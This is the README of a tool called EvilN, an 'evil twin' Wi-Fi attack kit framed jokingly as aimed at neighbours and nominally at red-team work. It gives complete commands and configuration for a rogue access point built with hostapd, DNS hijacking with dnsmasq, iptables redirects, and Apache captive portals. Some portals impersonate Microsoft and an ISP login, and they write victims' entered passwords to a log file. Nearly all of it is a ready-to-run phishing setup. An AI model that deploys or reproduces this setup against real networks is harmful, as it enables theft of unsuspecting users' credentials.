# EvilN -> Evil-Neighbor

if you love your neighbors, this tool is for you :)

Just kiding (not really... ), 

I wrote it just for helping you with your Penetration testing/Red Team assesment

!ANY USE OF THIS TOOL IS AT YOUR OWN RISK!

I recommend working with kali linux, preferably from VMware, and to get a better result, 
use dual band (--dual), but for this you will need two wifi adapters - two alfa.

## If you like things done authomatically, Use:

### Dual Band (2.4GHz and 5GHz):
- iface1 assosiated to -channel2.4 (2.4GHz)
- iface2 assosiated to -channel5 (5GHz)
```python
python3 EvilN.py --dual --iface1 wlan1 --iface2 wlan0 --channel2.4 1 --channel5 36 --ssid "MyLan" --network 10.0.0.0/24 --CaptivePortal microsoft
OR
python3 EvilN.py --dual --iface1 wlan1 --iface2 wlan0 --channel2.4 1 --channel5 36 --ssid "MyLan" --network 10.0.0.0/24 --CaptivePortal default
OR
python3 EvilN.py --dual --iface1 wlan1 --iface2 wlan0 --channel2.4 1 --channel5 36 --ssid "MyLan" --network 10.0.0.0/24 --CaptivePortal bezeq
```

### 2.4GHz Single:
```python
python3 EvilN.py --band 2.4 --iface wlan0 --ssid "MyLan" --channel 1 --network 10.0.0.0/24 --CaptivePortal microsoft
OR
python3 EvilN.py --band 2.4 --iface wlan0 --ssid "MyLan" --channel 6 --network 10.0.0.0/24 --CaptivePortal default
OR
python3 EvilN.py --band 2.4 --iface wlan0 --ssid "MyLan" --channel 6 --network 10.0.0.0/24 --CaptivePortal bezeq
```

### 5GHz Single:
```python
python3 EvilN.py --band 5 --iface wlan1 --ssid "MyLan" --channel 36 --network 10.0.0.0/24 --CaptivePortal microsoft
OR
python3 EvilN.py --band 5 --iface wlan1 --ssid "MyLan" --channel 40 --network 10.0.0.0/24 --CaptivePortal default
OR
python3 EvilN.py --band 5 --iface wlan1 --ssid "MyLan" --channel 40 --network 10.0.0.0/24 --CaptivePortal bezeq
```

## If you like things done manually, Use:

### 1) Installation all pachages:
```bash
sudo apt update
sudo apt install -y apache2 php libapache2-mod-php
sudo apt install -y hostapd dnsmasq lighttpd php
```

### 2) Setting up wlan0 Interface:
```bash
sudo ip link set wlan0 down
sudo ip addr flush dev wlan0
sudo ip addr add 192.168.50.1/24 dev wlan0
sudo ip link set wlan0 up
```

### 3) configure dnsmasq.conf file:
```bash
interface=wlan0
bind-interfaces
no-resolv
log-queries

dhcp-range=192.168.50.10,192.168.50.100,12h
dhcp-option=3,192.168.50.1
dhcp-option=6,192.168.50.1

address=/#/192.168.50.1

address=/captive.apple.com/192.168.50.1
address=/www.msftconnecttest.com/192.168.50.1
address=/connectivitycheck.gstatic.com/192.168.50.1
```

### 4.A) configure hostapd.conf file (2.4 GHz):
```bash
interface=wlan0
driver=nl80211
ssid=TestNetworkName 
hw_mode=g
channel=6
auth_algs=1
wmm_enabled=0
```

### 4.B) configure hostapd.conf file (5 GHz):
```bash
interface=wlan0
driver=nl80211
ssid=TestNetworkName 
hw_mode=a
channel=36
auth_algs=1
wmm_enabled=1
```

### 5) configure a2enmod:
```bash
sudo systemctl start apache2
sudo a2enmod rewrite
sudo a2enmod headers
sudo systemctl restart apache2
```

### 5) Create captive Foles:
```bash
sudo mkdir -p /var/www/captive
```

### 6.A) Create Web Captive Portal (Default):
```bash
sudo mv index.html /var/www/captive/
sudo mv save.php /var/www/captive/
```

### 6.B) Create Web Captive Portal (Microsoft):
```bash
sudo mv Microsoft/index.html /var/www/captive/
sudo mv Microsoft/save.php /var/www/captive/
sudo mv Microsoft/password.php /var/www/captive/
sudo mv Microsoft/save2.php /var/www/captive/
sudo mv Microsoft/microsoft.svg /var/www/captive/
```

### 7) Create log file:
```bash
sudo touch /var/log/ca.log
```

### 8) Permission for file:
```bash
sudo chown www-data:www-data /var/log/ca.log
sudo chmod 640 /var/log/ca.log
```

### 9.A) Create Vhost (default):
```bash
nano /etc/apache2/sites-available/captive.conf
```

```bash
<VirtualHost *:80>
    ServerName captive.portal
    ServerAlias *
    DocumentRoot /var/www/captive
    <Directory /var/www/captive>
        AllowOverride All
        Require all granted
    </Directory>

    # iOS/macOS
    Alias /hotspot-detect.html /var/www/captive/index.html
    # Android
    Alias /generate_204 /var/www/captive/index.html
    # Windows
    Alias /connecttest.txt /var/www/captive/index.html

    RewriteEngine On
    RewriteCond %{REQUEST_URI} !^/save\.php$
    RewriteRule ^.*$ /index.html [L]

    Header always set Cache-Control "no-store, no-cache, must-revalidate, max-age=0"
    Header always set Pragma "no-cache"
    Header always set Expires "0"
</VirtualHost>
```

### 9.B) Create Vhost (Microsoft):
```bash
nano /etc/apache2/sites-available/captive.conf
```

```bash
<VirtualHost *:80>
    ServerName captive.portal
    ServerAlias *
    DocumentRoot /var/www/captive

    <Directory /var/www/captive>
        AllowOverride None
        Require all granted
        Options -MultiViews
    </Directory>

    Alias /hotspot-detect.html /var/www/captive/index.html
    Alias /generate_204       /var/www/captive/index.html
    Alias /connecttest.txt    /var/www/captive/index.html

    RewriteEngine On
    RewriteCond %{REQUEST_URI} !^/(hotspot-detect\.html|generate_204|connecttest\.txt)$
    RewriteRule ^/?(save\.php|password\.php|save2\.php|microsoft\.svg)$ - [L]

    RewriteCond %{REQUEST_FILENAME} -f [OR]
    RewriteCond %{REQUEST_FILENAME} -d
    RewriteRule ^ - [L]
    RewriteRule ^ /index.html [L]
    Header always set Cache-Control "no-store, no-cache, must-revalidate, max-age=0"
    Header always set Pragma "no-cache"
    Header always set Expires "0"
    Header always set X-VHost "captive-portal"
    AddType image/svg+xml .svg .svgz
</VirtualHost>
```

### 10) Start a2ensite:
```bash
sudo a2ensite captive.conf
sudo a2dissite 000-default.conf
sudo systemctl reload apache2
```


### 11) Create IpTables:
```bash
sudo iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-ports 80
sudo iptables -t nat -A PREROUTING -i wlan0 -p udp --dport 53 -j REDIRECT --to-ports 53
sudo iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 53 -j REDIRECT --to-ports 53
```

### 12) start:
```bash
sudo dnsmasq -C dnsmasq.conf
sudo hostapd hostapd.conf
```

### Kill the process:
```bash
sudo pkill dnsmasq
sudo iptables -t nat -D PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-ports 80
sudo iptables -t nat -D PREROUTING -i wlan0 -p udp --dport 53 -j REDIRECT --to-ports 53
sudo iptables -t nat -D PREROUTING -i wlan0 -p tcp --dport 53 -j REDIRECT --to-ports 53
sudo rm dnsmasq.conf
sudo rm hostapd.conf
sudo rm /etc/apache2/sites-available/captive.conf
sudo rm /var/log/ca.log
sudo rm -r /var/www/captive/
sudo systemctl stop apache2
sudo ip link set wlan0 down
sudo ip addr flush dev wlan0
sudo ip link set wlan0 up
systemctl start NetworkManager
```
